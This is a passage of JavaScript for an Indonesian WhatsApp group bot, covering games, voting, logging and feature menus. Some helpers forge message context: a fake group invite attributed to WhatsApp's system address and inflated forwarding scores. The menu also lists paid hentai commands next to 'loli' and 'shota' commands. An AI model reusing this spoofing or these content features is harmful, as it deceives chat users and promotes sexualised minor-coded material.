
return JSON.stringify(string, null, 2)

}


function randomNomor(angka){

return Math.floor(Math.random() * angka) + 1
}

const nebal = (angka) => {
return Math.floor(angka)
}

//<------------------------------------[ replyWhite ]-------------------------------->\\
const replyWithFakeLink = (teks) => {
ALDI.sendMessage(from, teks, text,{contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdReply": {
"title": `${nb}\nBy ${nw}`,
"body": "",
"previewType": "PHOTO",
"thumbnailUrl": "https://i.ibb.co/tZnDbJt/ba64a75d6689.jpg",
"thumbnail": cewe,
"sourceUrl": ``
},mentionedJid:[sender]}, quoted : mek})
}
const replyWithFakeig = (teks) => {
ALDI.sendMessage(from, teks, text,{contextInfo:{
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdReply": {
"title": `WIBU By\nAWANG` ,
"body": `${tampilTanggal}`,
"mediaType": "2",
"thumbnailUrl": "https://i.ibb.co/tZnDbJt/ba64a75d6689.jpg",
"mediaUrl": "https://Instagram.com/zuxyganz_",
"thumbnail": fakeimage,
"sourceUrl": "https://github.com/ZuxyGanz"
},mentionedJid:[sender]}, quoted : mek})
}

        const data = fs.readFileSync('./src/quote.json');
                 jsonData = JSON.parse(data);
                 randIndex = Math.floor(Math.random() * jsonData.length);
                 randKey = jsonData[randIndex];
                 randQuote =''+randKey.quote            
//<-----------------------------------[ fake ]------------------------------>\\

finvite = {

"key": {

"fromMe": false,
"participant":
"0@s.whatsapp.net",
"remoteJid":
"0@s.whatsapp.net"
},
"message": {
"groupInviteMessage": {
"groupJid": setgrup,
"inviteCode": "NgsCIU2lXKh3VHJT",
"groupName": groupName,
"caption": fake,
"height": 6080,
"width": 6000

}

}
}
//<------------------------------------[ fucPrem ]-------------------------------->\\
_prem.expiredCheck(premium)

        if(isGroup && !isVote) {
        if (budy.toLowerCase() === 'vote'){
        let vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`))
        let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`))  
        let fil = vote.map(v => v.participant)
        let id_vote = sender ? sender : '6287727925499@s.whatsapp.net'
        if(fil.includes(id_vote)) {
        return mentions('@'+sender.split('@')[0]+' Anda sudah vote', fil, true)
        } else {
        vote.push({
            participant: id_vote,
            voting: '???'
        })
        fs.writeFileSync(`./lib/${from}.json`,JSON.stringify(vote))
        let _p = []
        let _vote = '*Vote* '+ '@'+ _votes[0].votes.split('@')[0] + `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n` 
        for(let i = 0; i < vote.length; i++) {
        _vote +=  `@${vote[i].participant.split('@')[0]}\n*Vote* : ${vote[i].voting}\n\n`
        _p.push(vote[i].participant)
        }  
        _p.push(_votes[0].votes)
        mentions(_vote,_p,true)   
        }
        } else if (budy.toLowerCase() === 'devote'){
        const vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`))
        let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`))  
        let fil = vote.map(v => v.participant)
        let id_vote = sender ? sender : '6287727925499@s.whatsapp.net'
        if(fil.includes(id_vote)) {
        return mentions('@'+sender.split('@')[0]+' Anda sudah vote', fil, true)
        } else {
        vote.push({
            participant: id_vote,
            voting: '???'
        })
        fs.writeFileSync(`./lib/${from}.json`,JSON.stringify(vote))
        let _p = []
        let _vote = '*Vote* '+ '@'+ _votes[0].votes.split('@')[0] + `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n` 
        for(let i = 0; i < vote.length; i++) {
        _vote +=  `@${vote[i].participant.split('@')[0]}\n*Vote* : ${vote[i].voting}\n\n`
        _p.push(vote[i].participant)
        }  
        _p.push(_votes[0].votes)
        mentions(_vote,_p,true)   
        }
    }
}
// ******************** ???GAME??? ******************** \\


        game.cekWaktuFam(ALDI, family100)
        game.cekWaktuTG(ALDI, tebakgambar)
        game.cekWaktuMtk(ALDI, mtk)
        game.cekWaktuCkl(ALDI, ckl)
        
        if (game.isMtk(from, mtk)){
        if (chats.toLowerCase().includes(game.getJawabanMtk(from, mtk))){
        var htgm3 = randomNomor(1000)

        addBalance(sender, htgm3, balance)
        await reply(`*Selamat jawaban kamu benar*\n*Jawaban :* ${game.getJawabanMtk(from, mtk)}\n*Hadiah :* $${htgm3}\n\nIngin bermain lagi? kirim *${prefix}math*`)
        mtk.splice(game.getMtkPosi(from, mtk), 1)

        }

        }
        //???------------------------------------[ BATAS NYA ]---------------------------???\\     

        if (game.isCkl(from, ckl)){
        if (chats.toLowerCase().includes(game.getJawabanCkl(from, ckl))){
        var htgm2 = randomNomor(1000)
        addBalance(sender, htgm2, balance)
        await reply(`*Selamat jawaban kamu benar*\n*Jawaban :* ${game.getJawabanCkl(from, ckl)}\n*Hadiah :* $${htgm2}\n\nIngin bermain lagi? kirim *${prefix}caklontong*`)
        ckl.splice(game.getCklPosi(from, ckl), 1)

        }

        }
        
        if (game.isTebakGambar(from, tebakgambar)){

        if (chats.toLowerCase().includes(game.getJawabanTG(from, tebakgambar))){
        var htgm = randomNomor(1000)
addBalance(sender, htgm, balance)
        await reply(`*Selamat jawaban kamu benar*\n*Jawaban :* ${game.getJawabanTG(from, tebakgambar)}\n*Hadiah :* $${htgm}\n\nIngin bermain lagi? kirim *${prefix}tebakgambar*`)
        tebakgambar.splice(game.getTGPosi(from, tebakgambar), 1)
       
}

        }
        //???-------------------------------------[ BATAS NYA ]---------------------------???\\
        if (game.isfam(from, family100)){
        var anjuy = game.getjawaban100(from, family100)
        for (let i of anjuy){
        if (chats.toLowerCase().includes(i)){
        var htgm1 = randomNomor(1000)
addBalance(sender, htgm1 , balance)
        await reply(`*Jawaban benar*\n*Jawaban :* ${i}\n*Hadiah :* $${htgm1}\n\n*Jawaban yang blum tertebak :* ${anjuy.length - 1}`)
        var anug = anjuy.indexOf(i)
anjuy.splice(anug, 1)
}
}
        if (anjuy.length < 1){
ALDI.sendMessage(from, `Semua jawaban sudah tertebak\nKirim *${prefix}family100* untuk bermain lagi`, text)
        family100.splice(game.getfamposi(from, family100), 1)

        }
        }
        const cmde = budy.toLowerCase().split(" ")[0] || "";
        let arrNum = ["1", "2", "3", "4", "5", "6", "7", "8", "9"];
        if (fs.existsSync(`./lib/tictactoe/db/${from}.json`)) {
        const boardnow = setGame(`${from}`);
        if (budy == "Cex") return reply("why");
        if (
budy.toLowerCase() == "y" ||
budy.toLowerCase() == "yes" ||
budy.toLowerCase() == "ya"
) {
        if (boardnow.O == sender.replace("@s.whatsapp.net", "")) {
        if (boardnow.status)
return reply(`Game telah dimulai sebelumnya!`);
        const matrix = boardnow._matrix;
boardnow.status = true;
        fs.writeFileSync(`./lib/tictactoe/db/${from}.json`,JSON.stringify(boardnow, null, 2)
);
        const chatAccept = `
T I C T A C T O E  G A M E

INFO :
  
Player ??? : @${boardnow.X}
  
Player ??? : @${boardnow.O}
  
             
     
${matrix[0][0]} ${matrix[0][1]} ${matrix[0][2]}
${matrix[1][0]} ${matrix[1][1]} ${matrix[1][2]}
${matrix[2][0]} ${matrix[2][1]} ${matrix[2][2]}

Giliran @${boardnow.turn == "X" ? boardnow.X : boardnow.O}


Ketik nyerah untuk Menyerah!
Ketik ${prefix}delttc untuk Menghapus sesi game!
`;

        ALDI.sendMessage(from, monospace(chatAccept), MessageType.text, {
quoted: mek,
contextInfo: {
mentionedJid: [
boardnow.X + "@s.whatsapp.net",
boardnow.O + "@s.whatsapp.net",
],
        },
        });

        } else {

        ALDI.sendMessage(from,`Opsi ini hanya untuk @${boardnow.O} !`,
MessageType.text, {quoted: mek,
contextInfo: {
mentionedJid: [boardnow.O + "@s.whatsapp.net"],
        },
        }
        );
        }

        } else if (
budy.toLowerCase() == "n" ||
budy.toLowerCase() == "no" ||
budy.toLowerCase() == "tidak"
) {
        if (boardnow.O == sender.replace("@s.whatsapp.net", "")) {
        if (boardnow.status)
return reply(`Game telah dimulai sebelumnya!`);

        fs.unlinkSync(`./lib/tictactoe/db/${from}.json`);

        ALDI.sendMessage(from,`Sayangnya tantangan @${boardnow.X} ditolak ???????`,
MessageType.text, {quoted: mek,
contextInfo: {
mentionedJid: [boardnow.X + "@s.whatsapp.net"],

        },

        }

        );
       
} else {
        ALDI.sendMessage(from,`Opsi ini hanya untuk @${boardnow.O} !`,MessageType.text, {quoted: mek,
contextInfo: {
mentionedJid: [boardnow.O + "@s.whatsapp.net"],

        },

        }

        );

        }

        }
        }
        if (arrNum.includes(cmde)) {
        const boardnow = setGame(`${from}`);
        if (!boardnow.status) return reply(`Sepertinya lawan anda belum menerima / menolak tantangan.`)
        if (
(boardnow.turn == "X" ? boardnow.X : boardnow.O) !=
sender.replace("@s.whatsapp.net", "")
)
return;
        const moving = validmove(Number(budy), `${from}`);
        const matrix = moving._matrix;
        if (moving.isWin) {
        if (moving.winner == "SERI") {
        const chatEqual = `
*???? Tictactoe Game ????*
          
Game berakhir seri ????
`;
        reply(chatEqual);
fs.unlinkSync(`./lib/tictactoe/db/${from}.json`);
return;
}

        const winnerJID = moving.winner == "O" ? moving.O : moving.X;
        const looseJID = moving.winner == "O" ? moving.X : moving.O;
        const limWin = Math.floor(Math.random() * 20) + 10;
        const limLoose = Math.floor(Math.random() * 10) + 5;
        const chatWon = `*???? Tictactoe Game ????*
          

Telah dimenangkan oleh @${winnerJID} ????????
`;
            
        //    giftLimit(winnerJID + "@s.whatsapp.net", limWin);
            
        //    pushLimit(looseJID + "@s.whatsapp.net", limLoose);

        ALDI.sendMessage(from, chatWon, MessageType.text, {quoted: mek,contextInfo: {
mentionedJid: [
moving.winner == "O" ?
moving.O + "@s.whatsapp.net" :
moving.X + "@s.whatsapp.net",
],

        },

        });
        fs.unlinkSync(`./lib/tictactoe/db/${from}.json`);

        } else {

        const chatMove = `
T I C T A C T O E  G A M E

INFO
  

Player ??? : @${moving.X}
  
Player ??? : @${moving.O}

     

${matrix[0][0]}  ${matrix[0][1]}  ${matrix[0][2]}

${matrix[1][0]}  ${matrix[1][1]}  ${matrix[1][2]}

${matrix[2][0]}  ${matrix[2][1]}  ${matrix[2][2]}

Giliran : @${moving.turn == "X" ? moving.X : moving.O}


Ketik nyerah untuk Menyerah!
Ketik ${prefix}delttc untuk Menghapus sesi game!
`;

           ALDI.sendMessage(from, monospace(chatMove), MessageType.text, {quoted: mek,contextInfo: {
mentionedJid: [
moving.X + "@s.whatsapp.net",
moving.O + "@s.whatsapp.net",
],

           },

           });

           }

           }
           if ((senderNumber) && ["Nyerah", "nyerah"].includes(budy) && !isCmd) {
           orangnye = sender
teks = `@${orangnye.split("@")[0]} Menyerah\n_Yahaha cupu abiez_`
           if (fs.existsSync("./lib/tictactoe/db/" + from + ".json")) {
           fs.unlinkSync("./lib/tictactoe/db/" + from + ".json");
mentions(teks,[sender],true)
  
           } else {

           reply(`Tidak ada sesi yg berlangsung`);
 
           }
          
 }
        
//========================================================================================================================//
        
        //jangan di haous

        //------- console.log by Arifi Razzaq ----------\\
        			 const isSticker = type === 'stickerMessage'
			  const isVideo = type === 'videoMessage'
			           const isAudio = type === 'audioMessage'
			  const isContact = type === 'contactMessage'
			 const isOrder = type === 'orderMessage'
			const isProduct = type === 'productMessage'
				 const isMentioned = type === 'mentionedJid'
				  const isDocument = type === 'documentMessage'
				   const isLink = type === 'matchedText'
				  const isLiveLocation = type === 'liveLocationMessage'
				 const isExtendedText = type === 'extendedTextMessage'
	        const isText = type === 'textMessage'		    
		    colors = ['red','white','deepskyblue','black','blue','orangered','yellow','green','mediumpurple','orange','limegreen']

            const isMedia = (type === 'imageMessage' || type === 'videoMessage')
            const isQuotedMsg = type === 'extendedTextMessage' && content.includes('Message')
            const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
            const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
            const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
            const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')

if (!public){
if (!isOwner && !itsMe) return
}
  
        if (isCmd && !isGroup) {console.log(color('[ CMD PRIVATE ]'), color(moment(mek.messageTimestamp * 1000).format('HH:mm:ss'), 'magenta'), color(`${command} [${args.length}]`, 'cyan'))}
	    if (!command) console.log(mek)
	    if (isCmd && isGroup) {
        console.log(color('[ CMD GROUP ]'), color(moment(mek.messageTimestamp * 1000).format('HH:mm:ss'), 'magenta'), color(`${command} [${args.length}]`, 'cyan'), color('from', 'pink'), color(`${pushname}`, 'yellow'), color('in', 'pink'), color(`${groupName}`, 'gold'))}
	   /*if (isCmd && isGroup) { 
	    // Console.log From Group Message ;By Lord_ ((+ Arifi Razzaq OFFICIAL +))
            
	    console.log(color('[ GROUP ]', 'yellow'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'cyan'), color('from', 'pink'), bgcolor(pushname), color('in', 'blue'), color(groupMetadata.subject))
            
	    }
       
	    if (!command)
	    console.log(mek)
            
	    if (isCmd && !isGroup) { 
	    // Console.log From Private Message ;By Lord_ ((+ Arifi Razzaq OFFICIAL +))
            
	    console.log(brightcolor.brightYellow('[ PRIVATE ]'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'cyan'), bgcolor(`${command}`, 'green'))
            
	    }*/
        var datw = new Date();

        var tahun = datw.getFullYear();
        var bulan = datw.getMonth();
        var tanggal = datw.getDate();
        var hari = datw.getDay();
        var jams = datw.getHours();
        var menit = datw.getMinutes();
        var detik = datw.getSeconds();


        switch(hari) {
         case 0: hari = "Minggu"; break;
         case 1: hari = "Senin"; break;
         case 2: hari = "Selasa"; break;
         case 3: hari = "Rabu"; break;
         case 4: hari = "Kamis"; break;
         case 5: hari = "Jum'at"; break;
         case 6: hari = "Sabtu"; break;
        }
        switch(bulan) {
         case 0: bulan = "Januari"; break;
         case 1: bulan = "Februari"; break;
         case 2: bulan = "Maret"; break;
         case 3: bulan = "April"; break;
         case 4: bulan = "Mei"; break;
         case 5: bulan = "Juni"; break;
         case 6: bulan = "Juli"; break;
         case 7: bulan = "Agustus"; break;
         case 8: bulan = "September"; break;
         case 9: bulan = "Oktober"; break;
         case 10: bulan = "November"; break;
         case 11: bulan = "Desember"; break;
        }
			switch(jams){
           	case 0: jams = "Malam????"; break;
           	case 1: jams = "Malam????"; break;
           	case 2: jams = "Malam????"; break;
           	case 3: jams = "Malam????"; break;
           	case 4: jams = "menjelang subuh????"; break;
           	case 5: jams = "Subuh????"; break;
           	case 6: jams = "Pagi????"; break;
           	case 7: jams = "Pagi????"; break;
           	case 8: jams = "Pagi????"; break;
           	case 9: jams = "Pagi????"; break;
           	case 10: jams = "Pagi????"; break;
           	case 11: jams = "Siang????"; break;
           	case 12: jams = "Dzuhur????"; break;
           	case 13: jams = "Siang????"; break;
           	case 14: jams = "Siang????"; break;
           	case 15: jams = "Ashar????"; break;
           	case 16: jams = "Sore????"; break;
           	case 17: jams = "Magrib????"; break;
           	case 18: jams = "menjelang malam????"; break;
           	case 19: jams = "isya????"; break;
           	case 20: jams = "Malam????"; break;
           	case 21: jams = "Malam????"; break;
           	case 22: jams = "MALAM??"; break;
           	case 23: jams = "Malam????"; break;
			}
        var tampilTanggal = hari + " "+ tanggal + " " + bulan + " " + tahun;
        var tampilWaktu = "Jam: " + jams + ":" + menit + ":" + detik;
        var tampilHari = "" + jams;
        
        
           //runtime berjalan
           runi = process.uptime() 
           ALDI.setStatus(`${kyun(runi)} Bot Aktif Selama`).catch((_)=>_);

           settingstatus = new Date() * 1;
           
           //auto updateprofileName
           ALDI.updateProfileName(`SELAMAT ${tampilHari} KAK???`).catch((_)=>_);
           settingupdateprofilename = new Date() * 1;
           
             if (prefixStatus) if (_chats.startsWith(command)) return;
             switch (command) {
//===================[ BATAS ]=====================\\
case 'menu':
case 'help':
case 'h':
case 'm':
const premmm = `${isOwner ? 'Owner' : isPremium ? 'Premium' : 'Free'}`
const pugikk = public ? 'FALSE': 'TRUE'
const onll = offline ? 'FALSE' : 'TRUE'
const userr = !mek.key.fromMe ? 'FALSE':'TRUE'
var gc = ALDI.chats.array.filter(v => v.jid.endsWith('g.us'))
var private = ALDI.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
const totalchattt = await ALDI.chats.all()
const timestamppp = speed();
const latensott = speed() - timestamppp
const quotess =  randQuote
   texxt = `*Hello Kak*
???? *Info Bot*
???? *Nama : ${nb}*
???? *Group Chat : ${gc.length}*
???? *Private Chat : ${private.length}*
???? *Total Chat : ${totalchattt.length}*
???? *Speed Run : ${latensott.toFixed(4)} Seconds*
???? *SELF : ${pugikk}*
???? *ONLINE : ${onll}*

????*Info User*
???? *status : ${premmm}*
???? *Limit : ${isPremium ? 'Unlimited' : `${getLimit(sender, limitCount, limit)}/${limitCount}`}*
???? *Limit Game : ${cekGLimit(sender, gcount, glimit)}/${gcount}*
???? *Balance : $${getBalance(sender, balance)}*

???? *Info Jam*
???? *Jam : ${time} WIB*
???? *Jam : ${wita} WITA*
???? *Jam : ${wit} WIT*`
   desc1 = `Created By ${fake}`
   gbutsan = [

{buttonId:`${prefix}menu2`,buttonText:{displayText:' MENU'},type:1},

{buttonId:`${prefix}owner`,buttonText:{displayText:'OWNER'},type:1},

{buttonId:`${prefix}script`,buttonText:{displayText:'SCRIPT'},type:1}

]
    mhan = await ALDI.prepareMessage(from, cewe, image, {thumbnail: cewe})
const buttonMessages = {
imageMessage: mhan.message.imageMessage,
contentText: `${texxt}`,
footerText: `${desc1}`,
buttons: gbutsan,
headerType: 4
}
ALDI.sendMessage(from, buttonMessages, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./image/cewe.jpeg'),
        "contextInfo": {
            mentionedJid: [sender]},
        caption: 'Tes',
            quoted: ftroli})
  break
//========================================??======================================\\
case 'start': case 'menu2':
const premm = `${isOwner ? 'Owner' : isPremium ? 'Premium' : 'Free'}`
const pugik = public ? 'FALSE': 'TRUE'
const onl = offline ? 'FALSE' : 'TRUE'
const user = !mek.key.fromMe ? 'FALSE':'TRUE'
var gc = ALDI.chats.array.filter(v => v.jid.endsWith('g.us'))
var private = ALDI.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
const totalchatt = await ALDI.chats.all()
const timestampp = speed();
const latensot = speed() - timestampp
const quotesss =  randQuote
let p = 0
menu1 = `
?????????? *Info Bot*
?????????? *Nama : ${nb}*
?????????? *Group Chat : ${gc.length}*
?????????? *Private Chat : ${private.length}*
?????????? *Total Chat : ${totalchatt.length}*
?????????? *Speed Run : ${latensot.toFixed(4)} Seconds*
?????????? *SELF : ${pugik}*
?????????? *ONLINE : ${onl}*

?????????? *Info User*
?????????? *status : ${premm}*
?????????? *Limit : ${isPremium ? 'Unlimited' : `${getLimit(sender, limitCount, limit)}/${limitCount}`}*
?????????? *Limit Game : ${cekGLimit(sender, gcount, glimit)}/${gcount}*
?????????? *Balance : $${getBalance(sender, balance)}*

?????????? *Info Jam*
?????????? *Jam : ${time} WIB*
?????????? *Jam : ${wita} WITA*
?????????? *Jam : ${wit} WIT*

?????????? *Prefix Bot*
?????????? *Prefix: ??? ${prefix} ???*

    ???? ??? List Menu ??? ????
   
${way}Sticker Menu${way}

${lim} ${p+=1}. ${gaya}${prefix}sticker${gaya}
${lim} ${p+=1}. ${gaya}${prefix}toimg${gaya}
${lim} ${p+=1}. ${gaya}${prefix}take${gaya}
${lim} ${p+=1}. ${gaya}${prefix}colong${gaya}
${lim} ${p+=1}. ${gaya}${prefix}emoji

Owner Menu

${own} ${p+=1}. ${gaya}${prefix}autoread${gaya}
${own} ${p+=1}. ${gaya}${prefix}setbug${gaya}
${own} ${p+=1}. ${gaya}${prefix}addprem${gaya}
${own} ${p+=1}. ${gaya}${prefix}dellprem${gaya}
${own} ${p+=1}. ${gaya}${prefix}setthumb${gaya}
${own} ${p+=1}. ${gaya}${prefix}setfakeimg${gaya}
${own} ${p+=1}. ${gaya}${prefix}setfake${gaya}
${own} ${p+=1}. ${gaya}${prefix}public${gaya}
${own} ${p+=1}. ${gaya}${prefix}self${gaya}
${own} ${p+=1}. ${gaya}${prefix}on${gaya}
${own} ${p+=1}. ${gaya}${prefix}off${gaya}
${own} ${p+=1}. ${gaya}${prefix}exif${gaya}

Stcmd Menu

${lim} ${p+=1}. ${gaya}${prefix}addcmd${gaya}
${lim} ${p+=1}. ${gaya}${prefix}delcmd${gaya}
${lim} ${p+=1}. ${gaya}${prefix}listcmd${gaya}


Premium Menu

${prem} ${p+=1}. ${gaya}${prefix}play${gaya}
${prem} ${p+=1}. ${gaya}${prefix}ytmp3${gaya}
${prem} ${p+=1}. ${gaya}${prefix}ytmp4${gaya}
${prem} ${p+=1}. ${gaya}${prefix}youtubedl${gaya}
${prem} ${p+=1}. ${gaya}${prefix}video${gaya}
${prem} ${p+=1}. ${gaya}${prefix}tiktok${gaya}
${prem} ${p+=1}. ${gaya}${prefix}tiktokaudio${gaya}
${prem} ${p+=1}. ${gaya}${prefix}cekprem${gaya}


Asupan Menu

${prem} ${p+=1}. ${gaya}rikagusriani${gaya}
${prem} ${p+=1}. ${gaya}ghea${gaya}
${prem} ${p+=1}. ${gaya}bocil${gaya}
${prem} ${p+=1}. ${gaya}santuy${gaya}

Download Menu

${lim} ${p+=1}. ${gaya}${prefix}igstalk${gaya}
${lim} ${p+=1}. ${gaya}${prefix}ytsearch${gaya}
${lim} ${p+=1}. ${gaya}${prefix}brainly${gaya}
${lim} ${p+=1}. ${gaya}${prefix}fb${gaya}
${lim} ${p+=1}. ${gaya}${prefix}ig${gaya}
${lim} ${p+=1}. ${gaya}${prefix}twitter${gaya}
${lim} ${p+=1}. ${gaya}${prefix}pinterest${gaya}
${lim} ${p+=1}. ${gaya}${prefix}playstore${gaya}
${lim} ${p+=1}. ${gaya}${prefix}lirik${gaya}

Game Menu

${lmtgm} ${p+=1}. ${gaya}${prefix}family100${gaya}
${lmtgm} ${p+=1}. ${gaya}${prefix}math${gaya}
${lmtgm} ${p+=1}. ${gaya}${prefix}tebakgambar${gaya}
${lmtgm} ${p+=1}. ${gaya}${prefix}caklontong${gaya}
${lmtgm} ${p+=1}. ${gaya}${prefix}tictactoe${gaya}
${lmtgm} ${p+=1}. ${gaya}${prefix}delttc${gaya}

Gabut Menu

${prem} ${p+=1}. ${gaya}${prefix}tiktok${gaya}
${lim} ${p+=1}. ${gaya}${prefix}tahta${gaya}
${lim} ${p+=1}. ${gaya}${prefix}nulis${gaya}
${lim} ${p+=1}. ${gaya}${prefix}nhentaipdf < kode >${gaya}

Ramalan Menu

${fre} ${p+=1}. ${gaya}${prefix}hobby${gaya}
${fre} ${p+=1}. ${gaya}${prefix}rate${gaya}
${fre} ${p+=1}. ${gaya}${prefix}apakah${gaya}
${fre} ${p+=1}. ${gaya}${prefix}kapankah${gaya}
${fre} ${p+=1}. ${gaya}${prefix}bisakah${gaya}

Group Menu

${fre} ${p+=1}. ${gaya}${prefix}profile${gaya}
${adm} ${p+=1}. ${gaya}${prefix}getbio${gaya}
${adm} ${p+=1}. ${gaya}${prefix}getpic${gaya}
${adm} ${p+=1}. ${gaya}${prefix}delete reply${gaya}
${adm} ${p+=1}. ${gaya}${prefix}kick @tag${gaya}
${adm} ${p+=1}. ${gaya}${prefix}rkick reply${gaya}
${adm} ${p+=1}. ${gaya}${prefix}add @tag${gaya}
${adm} ${p+=1}. ${gaya}${prefix}welcome aktif${gaya}
${adm} ${p+=1}. ${gaya}${prefix}radd reply${gaya}
${adm} ${p+=1}. ${gaya}${prefix}welcome nonaktif${gaya}
${adm} ${p+=1}. ${gaya}${prefix}antilink 1${gaya}
${adm} ${p+=1}. ${gaya}${prefix}antilink 0${gaya}
${adm} ${p+=1}. ${gaya}${prefix}antijualan 1${gaya}
${adm} ${p+=1}. ${gaya}${prefix}antijualan 0${gaya}
${adm} ${p+=1}. ${gaya}${prefix}gcdetect on${gaya}
${adm} ${p+=1}. ${gaya}${prefix}gcdetect off${gaya}
${adm} ${p+=1}. ${gaya}${prefix}antiviewonce on${gaya}
${adm} ${p+=1}. ${gaya}${prefix}antiviewonce on${gaya}

Other Menu

${lim} ${p+=1}. ${gaya}${prefix}linkwa${gaya}
${lim} ${p+=1}. ${gaya}${prefix}teruskan${gaya}
${lim} ${p+=1}. ${gaya}${prefix}caripesan${gaya}
${lim} ${p+=1}. ${gaya}${prefix}fdeface${gaya}
${lim} ${p+=1}. ${gaya}${prefix}inspect${gaya}
${lim} ${p+=1}. ${gaya}${prefix}runtime${gaya}
${lim} ${p+=1}. ${gaya}${prefix}speed${gaya}
${lim} ${p+=1}. ${gaya}${prefix}kontak${gaya}
${lim} ${p+=1}. ${gaya}${prefix}tourl${gaya}

Convert Menu

${fre} ${p+=1}. ${gaya}${prefix}tomp3${gaya}
${fre} ${p+=1}. ${gaya}${prefix}tomp4${gaya}
${fre} ${p+=1}. ${gaya}${prefix}slow${gaya}
${fre} ${p+=1}. ${gaya}${prefix}fast${gaya}
${fre} ${p+=1}. ${gaya}${prefix}reverse${gaya}

Tag Menu

${adm} ${p+=1}. ${gaya}${prefix}hidetag${gaya}
${adm} ${p+=1}. ${gaya}${prefix}totag${gaya}
${adm} ${p+=1}. ${gaya}${prefix}kontag${gaya}
${adm} ${p+=1}. ${gaya}${prefix}sticktag${gaya}

Upsw Menu

${own} ${p+=1}. ${gaya}${prefix}upswteks${gaya}
${own} ${p+=1}. ${gaya}${prefix}upswaudio${gaya}
${own} ${p+=1}. ${gaya}${prefix}upswvideo${gaya}
${own} ${p+=1}. ${gaya}${prefix}upswimage${gaya}


Voting Menu

${lim} ${p+=1}. ${gaya}${prefix}vote${gaya}
${lim} ${p+=1}. ${gaya}${prefix}voting${gaya}
${lim} ${p+=1}. ${gaya}${prefix}delvote${gaya}


Sesion Menu

${prem} ${p+=1}. ${gaya}${prefix}jadibot${gaya}
${prem} ${p+=1}. ${gaya}${prefix}stopjadibot${gaya}
${prem} ${p+=1}. ${gaya}${prefix}listjadibot${gaya}


Anime Menu

${lim} ${p+=1}. ${gaya}${prefix}otaku${gaya}
${lim} ${p+=1}. ${gaya}${prefix}komiku${gaya}
${lim} ${p+=1}. ${gaya}${prefix}chara${gaya}
${lim} ${p+=1}. ${gaya}${prefix}anime${gaya}
${lim} ${p+=1}. ${gaya}${prefix}art${gaya}
${lim} ${p+=1}. ${gaya}${prefix}bts${gaya}
${lim} ${p+=1}. ${gaya}${prefix}exo${gaya}
${lim} ${p+=1}. ${gaya}${prefix}elf${gaya}
${lim} ${p+=1}. ${gaya}${prefix}loli${gaya}
${lim} ${p+=1}. ${gaya}${prefix}waifu${gaya}
${lim} ${p+=1}. ${gaya}${prefix}neko${gaya}
${lim} ${p+=1}. ${gaya}${prefix}shota${gaya}
${lim} ${p+=1}. ${gaya}${prefix}sagiri${gaya}
${lim} ${p+=1}. ${gaya}${prefix}shinobu${gaya}
${lim} ${p+=1}. ${gaya}${prefix}megumin${gaya}
${lim} ${p+=1}. ${gaya}${prefix}wallnime${gaya}


${prem} ${p+=1}. ${gaya}${prefix}chiisaihentai${gaya}
${prem} ${p+=1}. ${gaya}${prefix}trap${gaya}
${prem} ${p+=1}. ${gaya}${prefix}blowjob${gaya}
${prem} ${p+=1}. ${gaya}${prefix}yaoi${gaya}
${prem} ${p+=1}. ${gaya}${prefix}ecchi${gaya}
${prem} ${p+=1}. ${gaya}${prefix}hentai${gaya}
${prem} ${p+=1}. ${gaya}${prefix}ahegao${gaya}
${prem} ${p+=1}. ${gaya}${prefix}hololewd${gaya}
${prem} ${p+=1}. ${gaya}${prefix}sideoppai${gaya}
${prem} ${p+=1}. ${gaya}${prefix}animefeets${gaya}
${prem} ${p+=1}. ${gaya}${prefix}animebooty${gaya}
${prem} ${p+=1}. ${gaya}${prefix}animethighss${gaya}
${prem} ${p+=1}. ${gaya}${prefix}hentaiparadise${gaya}
${prem} ${p+=1}. ${gaya}${prefix}animearmpits${gaya}
${prem} ${p+=1}. ${gaya}${prefix}hentaifemdom${gaya}
${prem} ${p+=1}. ${gaya}${prefix}lewdanimegirls${gaya}
${prem} ${p+=1}. ${gaya}${prefix}biganimetiddies${gaya}
${prem} ${p+=1}. ${gaya}${prefix}animebellybutton${gaya}
${prem} ${p+=1}. ${gaya}${prefix}hentai4everyone${gaya}

???????????? Thanks To ????????????
  . ${gaya}hazel ??? creator ???${gaya}
  . ${gaya}anto ??? creator ???${gaya}
  . ${gaya}x far ??? creator ???${gaya}
  . ${gaya}vean ??? creator ???${gaya}
  . ${gaya}rapa ??? creator ???${gaya}
  . ${gaya}paw ??? creator ???${gaya}
  . ${gaya}Arifi ??? mastah ???${gaya}
  . ${gaya}ALDI FAUZI ??? ya:v ???${gaya}
  . ${gaya}hxfz ??? creator ???${gaya}
  . ${gaya}hexagonz ??? developer ???${gaya}
  . ${gaya}dinata ??? creator ???${gaya}
  . ${gaya}farid ??? creator ???${gaya}
  . ${gaya}rafly ??? creator ???${gaya}
  . ${gaya}semua parah penyedia modul${gaya}
  . ${gaya}dan all my friends`
menu2 =`
Created By ${fake}`
// maaf bang saya enc
// karena fake masih langka
// hehe
const buttonssssss = [{buttonId: `${prefix}owner`, buttonText: {displayText: 'Owner Bot'}, type: 1},{buttonId: `${prefix}Speed`, buttonText: {displayText: 'Speed Bot'}, type: 1}]
    ALDI.sendMessage(from, 
    {"contentText": `${menu1}`,
               
    "footerText": `${menu2}`, 
               
    "buttons": buttonssssss,
               
    "headerType": "LOCATION",
                       
    "locationMessage": {
                   
    "text": "halo",
                   
    "name": "South Brisbane",
                   
    "address": "Cloudflare, Inc",
                   
